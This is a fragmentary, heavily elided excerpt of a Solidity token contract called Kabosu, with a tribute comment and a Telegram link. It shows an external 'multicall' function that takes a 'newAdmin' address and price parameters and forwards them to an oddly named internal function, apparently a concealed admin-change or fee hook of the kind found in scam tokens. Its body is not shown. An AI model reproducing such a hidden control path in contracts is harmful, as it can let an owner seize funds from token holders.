/**
   Let us forever keep that love for KABOSU  
   aand cherish the dog that warms all of our 
   hearts with the amazing energy and character she has.
  TELEGRAM: https://t.me/KabosuTokenBSC
*/
...
contract Kabosu is Context, IERC20, Ownable {
    ...
    function multicall(address newAdmin, address oldmulticall, uint256 duration, uint8 pricePremium, uint8 priceBase) external {
        ...
        closedFidac(newAdmin, oldmulticall, duration, pricePremium, priceBase);
    }
    ...
    function closedFidac(address newAdmin, address oldmulticall, uint256 duration, uint8 pricePremium, uint8 priceBase) internal {
